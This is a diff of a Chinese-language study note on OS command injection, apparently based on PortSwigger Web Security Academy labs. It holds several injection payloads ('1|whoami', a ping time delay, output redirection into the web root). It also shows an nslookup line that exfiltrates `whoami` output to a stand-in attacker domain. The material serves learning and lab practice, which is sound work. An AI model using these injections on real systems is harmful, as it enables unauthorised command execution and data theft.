@@ -22,13 +22,13 @@ Ref: [https://portswigger.net/web-security/os-command-injection](https://portswi
 
 在這個範例中，一個購物應用允許使用者查看特定商店中是否有商品哭錯。此資訊可以透過以下 URL 存取：
 
-```
+```raw
 https://insecure-website.com/stockStatus?productID=381&storeID=29
 ```
 
 為了提供這些資訊，應用必須查詢各種舊系統。由於一些歷史原因，該功能會調用 shell 指令，並將 `productID` 和 `storeID` 作為參數：
 
-```
+```bash
 stockreport.pl 381 29
 ```
 
@@ -36,19 +36,19 @@ stockreport.pl 381 29
 
 該應用不會針對指令注入進行防禦，因此攻擊者可以提交以下輸入來執行任意指令：
 
-```
+```bash
 & echo aiwefwlguh &
 ```
 
 如果在 `productID` 參數中提交此輸入，則應用會執行以下指令：
 
-```
+```bash
 stockreport.pl & echo aiwefwlguh & 29
 ```
 
 `echo` 指令會輸出提供的字串。這在測試某些類型的指令注入是有用的。`&` 字元是一個 shell 指令分隔符號。在這個範例中，他會導致一個接一個地執行三個單獨的指令。最後傳給使用者的輸出是：
 
-```
+```log
 Error - productID was not provided
 aiwefwlguh
 29: command not found
@@ -62,10 +62,11 @@ aiwefwlguh
 
 在注入的指令後面加上指令分隔符號 `&` 很有用個，因為它可以將指令與注入點之後的任何內容分開。這減少了被阻止注入的指令執行的可能性。
 
-* **Lab: [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)**
-    1. 使用 Burp Suite 的 Intercept 並修改查詢庫存的請求。
-    2. 將 `storeID` 參數的值改成 `1|whoami`。
-    3. 確認回應包含當前使用者名稱即可完成此 Lab。
+::: tip **Lab: [OS command injection, simple case](https://portswigger.net/web-security/os-command-injection/lab-simple)**
+1. 使用 Burp Suite 的 Intercept 並修改查詢庫存的請求。
+2. 將 `storeID` 參數的值改成 `1|whoami`。
+3. 確認回應包含當前使用者名稱即可完成此 Lab。
+:::
 
 ### 有用的指令
 
@@ -110,7 +111,7 @@ aiwefwlguh
 
 例如，假設一個網站允許使用者提交網站的回饋。使用者輸入電子郵件信箱以及回饋的訊息。接著，伺服器端會向網站管理員生成一封包含回饋的電子郵件。為此，它調用包含提交詳細資料的 `mail` 程式：
 
-```
+```bash
 mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
 ```
 
@@ -120,60 +121,64 @@ mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-we
 
 可以使用注入指令來觸發時間延遲，就能透過應用回應的時間確認指令是否已被執行。為此，`ping` 指令是好方法，因為可以指定發送的 ICMP 封包數量。這將能夠控制指令執行所花費的時間：
 
-```
+```bash
 & ping -c 10 127.0.0.1 &
 ```
 
 這個指令會讓應用對其網卡執行 ping 10 秒鐘。
 
-* **Lab: [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)**
-    1. 使用 Burp Suite 的 Intercept 並修改查詢庫存的請求。
-    2. 將 `storeID` 參數的值改成 `email=x||ping+-c+10+127.0.0.1||`。
-    3. 確認回應時間大於 10 秒即可完成此 Lab。
+::: tip **Lab: [Blind OS command injection with time delays](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)**
+1. 使用 Burp Suite 的 Intercept 並修改查詢庫存的請求。
+2. 將 `storeID` 參數的值改成 `email=x||ping+-c+10+127.0.0.1||`。
+3. 確認回應時間大於 10 秒即可完成此 Lab。
+:::
 
 ### 透過重新導向利用盲指令注入
 
 你可以將輸出到想到 Web 根目錄中的檔案中，然後再使用瀏覽器存取該檔。例如，如果應用從檔案系統位置 `/var/www/static` 提供靜態資源，則可以提交以下輸出：
 
-```
+```bash
 & whoami > /var/www/static/whoami.txt &
 ```
 
 `>` 字元將 `whoami` 指令的輸出發送到指定檔案。接著，你可以使用瀏覽器存取 `https://vulnerable-website.com/whoami.txt` 來查看檔案，並看到注入的指令的輸出。
 
-* **Lab: [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)**
-    1. 使用 Burp Suite 的 Intercept 並修改查詢庫存的請求。
-    2. 將 `storeID` 參數的值改成 `email=x||whoami > /var/www/images/whoami.txt||`。
-    3. 接著存取找到存取照片的 API：`/image?filename=16.jpg`
-    4. 將 `filename` 參數的值改成 `whoami.txt` 即可查看注入的指令的輸出並完全此 Lab。
+::: tip **Lab: [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)**
+1. 使用 Burp Suite 的 Intercept 並修改查詢庫存的請求。
+2. 將 `storeID` 參數的值改成 `email=x||whoami > /var/www/images/whoami.txt||`。
+3. 接著存取找到存取照片的 API：`/image?filename=16.jpg`
+4. 將 `filename` 參數的值改成 `whoami.txt` 即可查看注入的指令的輸出並完全此 Lab。
+:::
 
 ### 透過界外應用程式安全測試（OAST）技術利用盲指令注入
 
 你可以透過 OAST 技術，使用注入的指令觸發外部的網路交互。例如：
 
-```
+```bash
 & nslookup kgji2ohoyw.web-attacker.com &
 ```
 
 此 payload 會使用 `nslookup` 指令對指定網址進行 DNS 查詢。攻擊者可以檢測是否真的有進行查詢，以確認指令是否已成功注入。
 
-* **Lab: [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)**
-    1. 只有專業版的 Burp Suite 可以做這題啦，我窮人www
+::: tip **Lab: [Blind OS command injection with out-of-band interaction](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)**
+1. 只有專業版的 Burp Suite 可以做這題啦，我窮人www
+:::
 
 OAST 提供了一種簡單的方法將注入的指令輸出傳出去：
 
-```
+```bash
 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
 ```
 
 這會導致 DNS 查詢包含 `whoami` 指令輸出的網域名：
 
-```
+```raw
 wwwuser.kgji2ohoyw.web-attacker.com
 ```
 
-* **Lab: [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)**
-    1. 還是一樣需要專業版 Burp Suite 啦，歡迎贊助～
+::: tip **Lab: [Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)**
+1. 還是一樣需要專業版 Burp Suite 啦，歡迎贊助～
+:::
 
 ## 如何防範指令注入攻擊
 
